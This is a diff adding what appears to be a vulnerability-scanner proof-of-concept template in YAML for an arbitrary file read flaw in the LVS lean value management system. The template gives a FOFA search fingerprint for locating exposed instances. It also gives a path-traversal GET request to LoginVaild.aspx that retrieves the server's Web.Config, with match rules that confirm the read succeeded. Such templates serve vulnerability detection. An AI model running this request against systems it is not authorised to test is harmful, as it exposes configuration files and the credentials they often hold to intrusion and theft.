@@ -1,0 +1,16 @@
+id: poc-yaml-ji-la-ke-ji-loginvaild-aspx-anyfile-read
+info:
+  name: LVS精益价值管理系统 LoginVaild.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: LVS精益价值管理系统
+  fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+requests:
+- method: GET
+  path: /Business/LoginVaild.aspx?p=UploadFile/../Web.Config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    <appSettings>\") &&\ncontains(headers,\"filename=Web.Config\") &&\ncontains(content_type,\"\
+    application/ms-excel\")\n"
+variables: {}
+transport: http
